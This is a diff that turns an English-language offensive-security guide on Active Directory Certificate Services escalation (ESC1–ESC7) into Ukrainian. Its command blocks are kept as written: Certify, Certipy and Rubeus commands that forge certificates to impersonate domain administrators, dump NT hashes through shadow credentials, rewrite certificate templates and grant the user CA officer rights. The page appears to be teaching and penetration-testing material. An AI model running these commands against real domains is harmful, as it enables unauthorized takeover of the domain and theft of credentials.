@@ -6,119 +6,108 @@
 
 {% embed url="https://websec.nl/" %}
 
-**This is a summary of escalation technique sections of the posts:**
+**Це резюме секцій технік ескалації постів:**
 
 - [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 - [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
 - [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
 
-## Misconfigured Certificate Templates - ESC1
+## Неправильно налаштовані шаблони сертифікатів - ESC1
 
-### Explanation
+### Пояснення
 
-### Misconfigured Certificate Templates - ESC1 Explained
+### Неправильно налаштовані шаблони сертифікатів - ESC1 Пояснено
 
-- **Enrolment rights are granted to low-privileged users by the Enterprise CA.**
-- **Manager approval is not required.**
-- **No signatures from authorized personnel are needed.**
-- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights.**
-- **Certificate templates are configured to define EKUs that facilitate authentication:**
-  - Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
-- **The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**
-  - The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.
+- **Права на реєстрацію надаються користувачам з низькими привілеями корпоративним ЦС.**
+- **Затвердження менеджера не потрібне.**
+- **Не потрібні підписи уповноважених осіб.**
+- **Безпекові дескриптори на шаблонах сертифікатів є надто ліберальними, що дозволяє користувачам з низькими привілеями отримувати права на реєстрацію.**
+- **Шаблони сертифікатів налаштовані для визначення EKU, які полегшують аутентифікацію:**
+- Ідентифікатори розширеного використання ключів (EKU), такі як Аутентифікація клієнта (OID 1.3.6.1.5.5.7.3.2), Аутентифікація клієнта PKINIT (1.3.6.1.5.2.3.4), Вхід за допомогою смарт-картки (OID 1.3.6.1.4.1.311.20.2.2), Будь-яка мета (OID 2.5.29.37.0) або без EKU (SubCA) включені.
+- **Шаблон дозволяє запитувачам включати subjectAltName у Запит на підпис сертифіката (CSR):**
+- Active Directory (AD) надає пріоритет subjectAltName (SAN) у сертифікаті для перевірки особи, якщо він присутній. Це означає, що, вказуючи SAN у CSR, можна запросити сертифікат для видачі від імені будь-якого користувача (наприклад, адміністратора домену). Чи може запитувач вказати SAN, вказується в об'єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапора `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.
 
 > [!CAUTION]
-> The configuration outlined permits low-privileged users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos or SChannel.
+> Налаштування, описане вище, дозволяє користувачам з низькими привілеями запитувати сертифікати з будь-яким вибраним SAN, що дозволяє аутентифікацію як будь-який доменний принципал через Kerberos або SChannel.
 
-This feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by products or deployment services, or due to a lack of understanding.
+Ця функція іноді активується для підтримки генерації HTTPS або хост-сертифікатів на льоту продуктами або службами розгортання, або через брак розуміння.
 
-It is noted that creating a certificate with this option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template, which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.
+Зазначено, що створення сертифіката з цією опцією викликає попередження, чого не відбувається, коли існуючий шаблон сертифіката (такий як шаблон `WebServer`, у якого активовано `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюється, а потім модифікується для включення OID аутентифікації.
 
-### Abuse
+### Зловживання
 
-To **find vulnerable certificate templates** you can run:
-
+Щоб **знайти вразливі шаблони сертифікатів**, ви можете виконати:
 ```bash
 Certify.exe find /vulnerable
 certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 ```
-
-To **abuse this vulnerability to impersonate an administrator** one could run:
-
+Щоб **зловживати цією вразливістю для видавання себе за адміністратора**, можна виконати:
 ```bash
 Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
 ```
-
-Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or certipy** again:
-
+Тоді ви можете перетворити згенерований **сертифікат у формат `.pfx`** і використовувати його для **автентифікації за допомогою Rubeus або certipy** знову:
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
+Віконні двійкові файли "Certreq.exe" та "Certutil.exe" можуть бути використані для генерації PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-The Windows binaries "Certreq.exe" & "Certutil.exe" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
-
-The enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled, can be performed by running the following LDAP query:
-
+Перерахунок шаблонів сертифікатів у конфігураційній схемі лісу AD, зокрема тих, які не потребують затвердження або підписів, що мають EKU для клієнтської аутентифікації або Smart Card Logon, та з увімкненим прапором `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати, запустивши наступний LDAP запит:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
+## Неправильно налаштовані шаблони сертифікатів - ESC2
 
-## Misconfigured Certificate Templates - ESC2
+### Пояснення
 
-### Explanation
+Другий сценарій зловживання є варіацією першого:
 
-The second abuse scenario is a variation of the first one:
+1. Права на реєстрацію надаються користувачам з низькими привілеями через Enterprise CA.
+2. Вимога на затвердження менеджером вимкнена.
+3. Необхідність авторизованих підписів пропущена.
+4. Надмірно дозволяючий дескриптор безпеки на шаблоні сертифіката надає права на реєстрацію сертифікатів користувачам з низькими привілеями.
+5. **Шаблон сертифіката визначено так, щоб включати Any Purpose EKU або не мати EKU.**
 
-1. Enrollment rights are granted to low-privileged users by the Enterprise CA.
-2. The requirement for manager approval is disabled.
-3. The need for authorized signatures is omitted.
-4. An overly permissive security descriptor on the certificate template grants certificate enrollment rights to low-privileged users.
-5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**
+**Any Purpose EKU** дозволяє зловмиснику отримати сертифікат для **будь-якої мети**, включаючи автентифікацію клієнта, автентифікацію сервера, підписування коду тощо. Така ж **техніка, що використовується для ESC3**, може бути застосована для експлуатації цього сценарію.
 
-The **Any Purpose EKU** permits a certificate to be obtained by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same **technique used for ESC3** can be employed to exploit this scenario.
+Сертифікати з **без EKU**, які діють як сертифікати підпорядкованого CA, можуть бути використані для **будь-якої мети** і **також можуть бути використані для підписування нових сертифікатів**. Отже, зловмисник може вказати довільні EKU або поля в нових сертифікатах, використовуючи сертифікат підпорядкованого CA.
 
-Certificates with **no EKUs**, which act as subordinate CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.
+Однак нові сертифікати, створені для **автентифікації домену**, не будуть функціонувати, якщо підпорядкований CA не довіряється об'єкту **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Проте зловмисник все ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифікатів. Ці сертифікати можуть бути потенційно **зловживані** для широкого спектру цілей (наприклад, підписування коду, автентифікація сервера тощо) і можуть мати значні наслідки для інших додатків у мережі, таких як SAML, AD FS або IPSec.
 
-However, new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`** object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing, server authentication, etc.) and could have significant implications for other applications in the network like SAML, AD FS, or IPSec.
-
-To enumerate templates that match this scenario within the AD Forest’s configuration schema, the following LDAP query can be run:
-
+Щоб перерахувати шаблони, які відповідають цьому сценарію в конфігураційній схемі AD Forest, можна виконати наступний LDAP запит:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
 ```
+## Неправильно налаштовані шаблони агентів реєстрації - ESC3
 
-## Misconfigured Enrolment Agent Templates - ESC3
+### Пояснення
 
-### Explanation
+Цей сценарій схожий на перший і другий, але **зловживає** **іншим EKU** (Агент запиту сертифіката) та **2 різними шаблонами** (отже, має 2 набори вимог),
 
-This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),
+**EKU агента запиту сертифіката** (OID 1.3.6.1.4.1.311.20.2.1), відомий як **Агент реєстрації** в документації Microsoft, дозволяє суб'єкту **реєструватися** на **сертифікат** **від імені іншого користувача**.
 
-The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.
+**“Агент реєстрації”** реєструється в такому **шаблоні** і використовує отриманий **сертифікат для спільного підписання CSR від імені іншого користувача**. Потім він **надсилає** **спільно підписаний CSR** до CA, реєструючись у **шаблоні**, який **дозволяє “реєстрацію від імені”**, і CA відповідає **сертифікатом, що належить “іншому” користувачу**.
 
-The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.
+**Вимоги 1:**
 
-**Requirements 1:**
+- Права на реєстрацію надаються користувачам з низькими привілеями через Enterprise CA.
+- Вимога на затвердження менеджера пропускається.
+- Немає вимоги на авторизовані підписи.
+- Безпековий дескриптор шаблону сертифіката є надмірно дозволяючим, надаючи права на реєстрацію користувачам з низькими привілеями.
+- Шаблон сертифіката включає EKU агента запиту сертифіката, що дозволяє запитувати інші шаблони сертифікатів від імені інших суб'єктів.
 
-- Enrollment rights are granted to low-privileged users by the Enterprise CA.
-- The requirement for manager approval is omitted.
-- No requirement for authorized signatures.
-- The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
-- The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.
+**Вимоги 2:**
 
-**Requirements 2:**
+- Enterprise CA надає права на реєстрацію користувачам з низькими привілеями.
+- Затвердження менеджера обходиться.
+- Версія схеми шаблону є або 1, або перевищує 2, і вона вказує на вимогу політики застосування, яка вимагає EKU агента запиту сертифіката.
+- EKU, визначений у шаблоні сертифіката, дозволяє доменну аутентифікацію.
+- Обмеження для агентів реєстрації не застосовуються на CA.
 
-- The Enterprise CA grants enrollment rights to low-privileged users.
-- Manager approval is bypassed.
-- The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
-- An EKU defined in the certificate template permits domain authentication.
-- Restrictions for enrollment agents are not applied on the CA.
+### Зловживання
 
-### Abuse
-
-You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:
-
+Ви можете використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy) для зловживання цим сценарієм:
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
@@ -132,43 +121,39 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
+**Користувачі**, яким дозволено **отримувати** **сертифікат агента реєстрації**, шаблони, в яких агентам реєстрації дозволено реєструватися, та **рахунки**, від імені яких агент реєстрації може діяти, можуть бути обмежені корпоративними ЦС. Це досягається шляхом відкриття `certsrc.msc` **додатку**, **клацання правою кнопкою миші на ЦС**, **вибору Властивості**, а потім **переміщення** на вкладку “Агенти реєстрації”.
 
-The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.
+Однак зазначено, що **за замовчуванням** налаштування для ЦС полягає в тому, щоб “**Не обмежувати агентів реєстрації**.” Коли обмеження для агентів реєстрації активується адміністраторами, встановлення його на “Обмежити агентів реєстрації” залишає конфігурацію за замовчуванням надзвичайно ліберальною. Це дозволяє **всім** отримати доступ до реєстрації в усіх шаблонах як будь-хто.
 
-However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.
+## Вразливий контроль доступу до шаблону сертифіката - ESC4
 
-## Vulnerable Certificate Template Access Control - ESC4
+### **Пояснення**
 
-### **Explanation**
+**Безпековий дескриптор** на **шаблонах сертифікатів** визначає **дозволи**, які конкретні **принципали AD** мають щодо шаблону.
 
-The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.
+Якщо **зловмисник** має необхідні **дозволи** для **зміни** **шаблону** та **встановлення** будь-яких **експлуатованих неправильних налаштувань**, описаних у **попередніх розділах**, це може сприяти ескалації привілеїв.
 
-Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.
+Значні дозволи, що застосовуються до шаблонів сертифікатів, включають:
 
-Notable permissions applicable to certificate templates include:
+- **Власник:** Надає неявний контроль над об'єктом, дозволяючи змінювати будь-які атрибути.
+- **Повний контроль:** Дозволяє повну владу над об'єктом, включаючи можливість змінювати будь-які атрибути.
+- **Змінити власника:** Дозволяє змінювати власника об'єкта на принципала під контролем зловмисника.
+- **Змінити DACL:** Дозволяє коригувати контроль доступу, потенційно надаючи зловмиснику Повний контроль.
+- **Змінити властивість:** Дозволяє редагувати будь-які властивості об'єкта.
 
-- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
-- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
-- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
-- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
-- **WriteProperty:** Authorizes the editing of any object properties.
+### Зловживання
 
-### Abuse
-
-An example of a privesc like the previous one:
+Приклад ескалації привілеїв, подібний до попереднього:
 
 <figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
 
-ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
+ESC4 - це коли користувач має права на запис над шаблоном сертифіката. Це може, наприклад, бути зловжито для переписування конфігурації шаблона сертифіката, щоб зробити шаблон вразливим до ESC1.
 
-As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.
-
+Як ми можемо бачити в наведеному вище шляху, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` має новий `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов'язана з сертифікатами, я також реалізував цю атаку, яка відома як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ось невеликий попередній перегляд команди `shadow auto` Certipy для отримання NT хешу жертви.
 ```bash
 certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
 ```
-
-**Certipy** can overwrite the configuration of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will be useful for **restoring** the configuration after our attack.
-
+**Certipy** може перезаписати конфігурацію шаблону сертифіката одним командою. За **замовчуванням** Certipy **перезаписує** конфігурацію, щоб зробити її **вразливою до ESC1**. Ми також можемо вказати **`-save-old` параметр для збереження старої конфігурації**, що буде корисно для **відновлення** конфігурації після нашої атаки.
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -179,43 +164,37 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
+## Вразливий контроль доступу до об'єктів PKI - ESC5
 
-## Vulnerable PKI Object Access Control - ESC5
+### Пояснення
 
-### Explanation
+Широка мережа взаємопов'язаних відносин на основі ACL, яка включає кілька об'єктів, крім шаблонів сертифікатів і центру сертифікації, може вплинути на безпеку всієї системи AD CS. Ці об'єкти, які можуть суттєво вплинути на безпеку, охоплюють:
 
-The extensive web of interconnected ACL-based relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the security of the entire AD CS system. These objects, which can significantly affect security, encompass:
+- Об'єкт комп'ютера AD сервера CA, який може бути скомпрометований через механізми, такі як S4U2Self або S4U2Proxy.
+- RPC/DCOM сервер сервера CA.
+- Будь-який нащадок об'єкта AD або контейнера в межах конкретного контейнерного шляху `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, але не обмежується, контейнерами та об'єктами, такими як контейнер шаблонів сертифікатів, контейнер сертифікаційних центрів, об'єкт NTAuthCertificates та контейнер послуг реєстрації.
 
-- The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
-- The RPC/DCOM server of the CA server.
-- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.
-
-The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.
+Безпека системи PKI може бути скомпрометована, якщо зловмисник з низькими привілеями зможе отримати контроль над будь-яким з цих критичних компонентів.
 
 ## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
-### Explanation
+### Пояснення
 
-The subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration, when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged** user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to authenticate as a domain administrator or **any other active entity** within the domain.
+Тема, обговорена в [**пості CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), також торкається наслідків прапора **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, як зазначено Microsoft. Ця конфігурація, коли вона активована на Центрі сертифікації (CA), дозволяє включати **значення, визначені користувачем**, у **додаткову назву суб'єкта** для **будь-якого запиту**, включаючи ті, що створені з Active Directory®. Внаслідок цього, ця можливість дозволяє **зловмиснику** зареєструватися через **будь-який шаблон**, налаштований для **автентифікації** домену — зокрема, ті, що відкриті для реєстрації **непривілейованих** користувачів, такі як стандартний шаблон користувача. Як результат, сертифікат може бути отриманий, що дозволяє зловмиснику автентифікуватися як доменний адміністратор або **будь-яка інша активна сутність** в межах домену.
 
-**Note**: The approach for appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib "SAN:"` argument in `certreq.exe` (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.
+**Примітка**: Підхід до додавання **додаткових імен** у Запит на підписання сертифіката (CSR) через аргумент `-attrib "SAN:"` у `certreq.exe` (який називається “Пари значення імен”) представляє **контраст** з експлуатаційною стратегією SAN у ESC1. Тут відмінність полягає в **тому, як інформація про обліковий запис інкапсульована** — в атрибуті сертифіката, а не в розширенні.
 
-### Abuse
+### Зловживання
 
-To verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:
-
+Щоб перевірити, чи активовано налаштування, організації можуть використовувати наступну команду з `certutil.exe`:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 ```
-
-This operation essentially employs **remote registry access**, hence, an alternative approach might be:
-
+Ця операція в основному використовує **доступ до віддаленого реєстру**, отже, альтернативний підхід може бути:
 ```bash
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
 ```
-
-Tools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy) are capable of detecting this misconfiguration and exploiting it:
-
+Інструменти, такі як [**Certify**](https://github.com/GhostPack/Certify) та [**Certipy**](https://github.com/ly4k/Certipy), здатні виявляти цю неправильну конфігурацію та експлуатувати її:
 ```bash
 # Detect vulnerabilities, including this one
 Certify.exe find
@@ -224,47 +203,39 @@ Certify.exe find
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 ```
-
-To alter these settings, assuming one possesses **domain administrative** rights or equivalent, the following command can be executed from any workstation:
-
+Щоб змінити ці налаштування, припускаючи, що у вас є **права адміністратора домену** або еквівалентні, можна виконати наступну команду з будь-якої робочої станції:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
-
-To disable this configuration in your environment, the flag can be removed with:
-
+Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
-
 > [!WARNING]
-> Post the May 2022 security updates, newly issued **certificates** will contain a **security extension** that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However, for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\
-> To exploit ESC6, it is essential for the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.
+> Після оновлень безпеки травня 2022 року, нові **сертифікати** міститимуть **розширення безпеки**, яке включає **властивість `objectSid` запитувача**. Для ESC1 цей SID отримується з вказаного SAN. Однак для **ESC6** SID відображає **`objectSid` запитувача**, а не SAN.\
+> Щоб експлуатувати ESC6, важливо, щоб система була вразливою до ESC10 (Слабкі відображення сертифікатів), яке надає пріоритет **SAN над новим розширенням безпеки**.
 
-## Vulnerable Certificate Authority Access Control - ESC7
+## Вразливий контроль доступу до центру сертифікації - ESC7
 
-### Attack 1
+### Атака 1
 
-#### Explanation
+#### Пояснення
 
-Access control for a certificate authority is maintained through a set of permissions that govern CA actions. These permissions can be viewed by accessing `certsrv.msc`, right-clicking a CA, selecting properties, and then navigating to the Security tab. Additionally, permissions can be enumerated using the PSPKI module with commands such as:
-
+Контроль доступу для центру сертифікації підтримується через набір дозволів, які регулюють дії CA. Ці дозволи можна переглянути, отримавши доступ до `certsrv.msc`, клацнувши правою кнопкою миші на CA, вибравши властивості, а потім перейшовши на вкладку Безпека. Крім того, дозволи можна перерахувати за допомогою модуля PSPKI з командами, такими як:
 ```bash
 Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
 ```
+Це надає уявлення про основні права, а саме **`ManageCA`** та **`ManageCertificates`**, що відповідають ролям "адміністратор CA" та "менеджер сертифікатів" відповідно.
 
-This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.
+#### Зловживання
 
-#### Abuse
+Наявність прав **`ManageCA`** на центрі сертифікації дозволяє суб'єкту віддалено маніпулювати налаштуваннями за допомогою PSPKI. Це включає в себе перемикання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`** для дозволу специфікації SAN у будь-якому шаблоні, що є критичним аспектом ескалації домену.
 
-Having **`ManageCA`** rights on a certificate authority enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.
+Спрощення цього процесу можливе за допомогою команди PSPKI **Enable-PolicyModuleFlag**, що дозволяє вносити зміни без прямої взаємодії з GUI.
 
-Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.
+Володіння правами **`ManageCertificates`** полегшує затвердження очікуючих запитів, ефективно обходячи захист "затвердження менеджера сертифікатів CA".
 
-Possession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.
-
-A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:
-
+Комбінація модулів **Certify** та **PSPKI** може бути використана для запиту, затвердження та завантаження сертифіката:
 ```powershell
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
@@ -280,37 +251,33 @@ Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -R
 # Download the certificate
 Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 ```
-
 ### Attack 2
 
 #### Explanation
 
 > [!WARNING]
-> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.
+> У **попередньому нападі** **`Manage CA`** дозволи використовувалися для **включення** прапора **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання **ESC6 атаки**, але це не матиме жодного ефекту, поки служба CA (`CertSvc`) не буде перезапущена. Коли у користувача є право доступу **`Manage CA`**, користувач також має право **перезапустити службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, E**SC6 може не працювати з коробки** у більшості патчованих середовищ через оновлення безпеки травня 2022 року.
 
-Therefore, another attack is presented here.
+Тому тут представлено інший напад.
 
-Perquisites:
+Пер prerequisites:
 
-- Only **`ManageCA` permission**
-- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)
-- Certificate template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)
+- Тільки **`ManageCA` дозвіл**
+- **`Manage Certificates`** дозвіл (може бути наданий з **`ManageCA`**)
+- Шаблон сертифіката **`SubCA`** повинен бути **включений** (може бути включений з **`ManageCA`**)
 
-The technique relies on the fact that users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`** certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user** can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.
+Техніка ґрунтується на тому, що користувачі з правами доступу **`Manage CA`** _та_ **`Manage Certificates`** можуть **видавати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** є **вразливим до ESC1**, але **тільки адміністратори** можуть зареєструватися в шаблоні. Таким чином, **користувач** може **запросити** реєстрацію в **`SubCA`** - що буде **відхилено** - але **потім видано менеджером пізніше**.
 
 #### Abuse
 
-You can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.
-
+Ви можете **наділити себе правом доступу `Manage Certificates`**, додавши свого користувача як нового офіцера.
 ```bash
 certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
